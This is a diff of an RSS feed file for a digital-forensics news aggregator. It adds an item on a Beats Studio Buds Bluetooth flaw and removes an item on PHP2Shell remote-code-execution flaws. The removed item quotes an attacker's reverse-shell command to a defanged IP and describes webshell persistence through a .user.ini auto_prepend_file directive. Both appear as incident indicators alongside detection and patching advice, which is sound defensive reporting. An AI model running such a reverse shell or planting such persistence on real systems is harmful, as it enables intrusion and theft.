@@ -5,8 +5,22 @@
     <link>https://x.com/DFIR_Radar</link>
     <description>Keeping DFIR Intelligence on your Radar. The latest DFIR research from hundreds of sources, ranked by relevance for practitioners.</description>
     <language>en</language>
-    <lastBuildDate>Sat, 07 Nov 2026 20:02:01 +0000</lastBuildDate>
+    <lastBuildDate>Sat, 07 Nov 2026 21:02:28 +0000</lastBuildDate>
     <atom:link href="https://falhumaid.github.io/DFIR_Radar_RSS/rss.xml" rel="self" type="application/rss+xml"/>
+    <item>
+      <title>The bluetooth trust problem we carry in our ears</title>
+      <link>https://www.jamf.com/blog/the-bluetooth-trust-problem-we-carry-in-our-ears/</link>
+      <description>CVE-2025-20701 in Beats Studio Buds let a nearby attacker win a case-open pairing race, bond persistently, and extract the Identity Resolving Key. Update to firmware 1B211; treat unexpected audio routing changes as an investigation trigger.
+
+#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2119173659525070907</description>
+      <content:encoded><![CDATA[<p>CVE-2025-20701 in Beats Studio Buds let a nearby attacker win a case-open pairing race, bond persistently, and extract the Identity Resolving Key. Update to firmware 1B211; treat unexpected audio routing changes as an investigation trigger.</p><p>#DFIR_Radar</p><p><a href="https://www.jamf.com/blog/the-bluetooth-trust-problem-we-carry-in-our-ears/">Read the report</a> | <a href="https://x.com/DFIR_Radar/status/2119173659525070907">View on X</a></p>]]></content:encoded>
+      <dc:creator>Jamf Threat Labs</dc:creator>
+      <comments>https://x.com/DFIR_Radar/status/2119173659525070907</comments>
+      <category>THREAT INTELLIGENCE</category>
+      <source url="https://x.com/DFIR_Radar/status/2119173659525070907">DFIR Radar</source>
+      <pubDate>Sat, 07 Nov 2026 21:02:28 +0000</pubDate>
+      <guid isPermaLink="false">2119173659525070907</guid>
+    </item>
     <item>
       <title>Inside ARTEX: AI Hacking Tools, Exposed Servers and South Korean Bank Breaches</title>
       <link>https://securityaffairs.com/202607/ai/inside-artex-ai-hacking-tools-exposed-servers-and-south-korean-bank-breaches.html</link>
@@ -2216,32 +2230,6 @@ Practitioner takeaway: before you run anything, decide two things: where the age
       <source url="https://x.com/DFIR_Radar/status/2117663785444069637">DFIR Radar</source>
       <pubDate>Tue, 03 Nov 2026 17:02:46 +0000</pubDate>
       <guid isPermaLink="false">2117663785444069637</guid>
-    </item>
-    <item>
-      <title>PHP2Shell Detection</title>
-      <link>https://socprime.com/blog/php2shell-detection/</link>
-      <description>CVE-2026-109618 and CVE-2026-109619 (PHP2Shell), both CVSS v4.0 9.2, are actively exploited unauthenticated RCE flaws in PHP core. CISA added CVE-2026-109618 to KEV on 26 October 2026, with confirmed in-the-wild exploitation observed a day before fixes shipped.
-
-Key findings:
-
-- CVE-2026-109618 is an out-of-memory corruption bug: PHP leaves internal request data half-initialized on memory exhaustion, then trusts it during cleanup. CVE-2026-109619 is a stale global state bug: internal state outlives the request memory it points to, so a worker's next request can act on leftover data. Both reach code execution as the web server user with no authentication required. Every PHP branch below 8.5.12, 8.4.27, 8.3.36, and 8.2.35 is affected. PHP 7.4, 8.0, and 8.1 receive no official fix; PHP 7.3 and older including PHP 5 have no fix at all. PHP rates Apache mod_php at highest risk because exploitation can succeed before any application code runs.
-
-- The attack chain in the analyzed 6-event log sample from web-prod-01 compressed the entire compromise into three seconds on 22 October 2026: a PHP fatal "Allowed memory size exhausted" error and a SIGSEGV crash of PHP-FPM child 1201 as the exploitation signal, followed immediately by php-fpm (running as www-data) spawning sh -c bash /dev/shm/.s, a script staged in RAM-backed storage, then a classic reverse shell: bash -i &gt;&amp; /dev/tcp/198.51.100[.]23/4444 0&gt;&amp;1. Persistence landed as a webshell at uploads/.cache.php loaded on every PHP request via a .user.ini auto_prepend_file directive.
-
-- The log sample blended two source types into one ECS-style schema: plain-text PHP runtime and PHP-FPM error log lines alongside normalized file and process events from EDR telemetry. The PHP-FPM crash line was the first signal; the EDR file events revealed the persistence mechanism. Either source alone tells only half the story, which is the core argument for routing both PHP/PHP-FPM error logs and EDR telemetry into the same SIEM pipeline.
-
-- Scope is wide: PHP-FPM, Apache mod_php, php-cgi, LiteSpeed, and FrankenPHP deployments are all in scope. Public PoC code and exploit frameworks appeared on GitHub within days of the 20 October 2026 social media leak. One research toolkit reports verified command execution as www-data across PHP 7.4 through 8.4 below the fixed releases. A separate, configuration-dependent session upload-progress vector (CVE-2026-115560) is not part of PHP2Shell but carries an interim mitigation of session.upload_progress.enabled = 0.
-
-Practitioner takeaway: On any host you suspect was hit before patching, treat it as compromised, not just unpatched. Isolate the host, then preserve before you clean: copy uploads/.cache.php, .user.ini, and /dev/shm/.s now because /dev/shm is wiped on reboot. Block egress to 198.51.100[.]23:4444. Remove the auto_prepend_file directive from .user.ini and audit the entire web fleet for .user.ini files containing auto_prepend_file, hidden PHP files in upload folders, and process trees showing shells spawned by php-fpm, php-cgi, apache2, or httpd. Rotate every credential readable by www-data: database passwords, API keys, and application config secrets must be treated as exposed. For detection, alert on PHP memory exhaustion errors and PHP-FPM worker SIGSEGV crashes as the earliest exploitation signal, then correlate with child process spawns from web server parent processes. Patch to 8.5.12, 8.4.27, 8.3.36, or 8.2.35 and restart every PHP worker; PHP states no configuration change fully mitigates these flaws.
-
-#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2117648671823036780</description>
-      <content:encoded><![CDATA[<p>CVE-2026-109618 and CVE-2026-109619 (PHP2Shell), both CVSS v4.0 9.2, are actively exploited unauthenticated RCE flaws in PHP core. CISA added CVE-2026-109618 to KEV on 26 October 2026, with confirmed in-the-wild exploitation observed a day before fixes shipped.</p><p>Key findings:</p><p>- CVE-2026-109618 is an out-of-memory corruption bug: PHP leaves internal request data half-initialized on memory exhaustion, then trusts it during cleanup. CVE-2026-109619 is a stale global state bug: internal state outlives the request memory it points to, so a worker&#x27;s next request can act on leftover data. Both reach code execution as the web server user with no authentication required. Every PHP branch below 8.5.12, 8.4.27, 8.3.36, and 8.2.35 is affected. PHP 7.4, 8.0, and 8.1 receive no official fix; PHP 7.3 and older including PHP 5 have no fix at all. PHP rates Apache mod_php at highest risk because exploitation can succeed before any application code runs.</p><p>- The attack chain in the analyzed 6-event log sample from web-prod-01 compressed the entire compromise into three seconds on 22 October 2026: a PHP fatal &quot;Allowed memory size exhausted&quot; error and a SIGSEGV crash of PHP-FPM child 1201 as the exploitation signal, followed immediately by php-fpm (running as www-data) spawning sh -c bash /dev/shm/.s, a script staged in RAM-backed storage, then a classic reverse shell: bash -i &gt;&amp; /dev/tcp/198.51.100[.]23/4444 0&gt;&amp;1. Persistence landed as a webshell at uploads/.cache.php loaded on every PHP request via a .user.ini auto_prepend_file directive.</p><p>- The log sample blended two source types into one ECS-style schema: plain-text PHP runtime and PHP-FPM error log lines alongside normalized file and process events from EDR telemetry. The PHP-FPM crash line was the first signal; the EDR file events revealed the persistence mechanism. Either source alone tells only half the story, which is the core argument for routing both PHP/PHP-FPM error logs and EDR telemetry into the same SIEM pipeline.</p><p>- Scope is wide: PHP-FPM, Apache mod_php, php-cgi, LiteSpeed, and FrankenPHP deployments are all in scope. Public PoC code and exploit frameworks appeared on GitHub within days of the 20 October 2026 social media leak. One research toolkit reports verified command execution as www-data across PHP 7.4 through 8.4 below the fixed releases. A separate, configuration-dependent session upload-progress vector (CVE-2026-115560) is not part of PHP2Shell but carries an interim mitigation of session.upload_progress.enabled = 0.</p><p>Practitioner takeaway: On any host you suspect was hit before patching, treat it as compromised, not just unpatched. Isolate the host, then preserve before you clean: copy uploads/.cache.php, .user.ini, and /dev/shm/.s now because /dev/shm is wiped on reboot. Block egress to 198.51.100[.]23:4444. Remove the auto_prepend_file directive from .user.ini and audit the entire web fleet for .user.ini files containing auto_prepend_file, hidden PHP files in upload folders, and process trees showing shells spawned by php-fpm, php-cgi, apache2, or httpd. Rotate every credential readable by www-data: database passwords, API keys, and application config secrets must be treated as exposed. For detection, alert on PHP memory exhaustion errors and PHP-FPM worker SIGSEGV crashes as the earliest exploitation signal, then correlate with child process spawns from web server parent processes. Patch to 8.5.12, 8.4.27, 8.3.36, or 8.2.35 and restart every PHP worker; PHP states no configuration change fully mitigates these flaws.</p><p>#DFIR_Radar</p><p><a href="https://socprime.com/blog/php2shell-detection/">Read the report</a> | <a href="https://x.com/DFIR_Radar/status/2117648671823036780">View on X</a></p>]]></content:encoded>
-      <dc:creator>SOCPrime</dc:creator>
-      <comments>https://x.com/DFIR_Radar/status/2117648671823036780</comments>
-      <category>VULNERABILITY</category>
-      <source url="https://x.com/DFIR_Radar/status/2117648671823036780">DFIR Radar</source>
-      <pubDate>Tue, 03 Nov 2026 16:02:43 +0000</pubDate>
-      <guid isPermaLink="false">2117648671823036780</guid>
     </item>
   </channel>
 </rss>
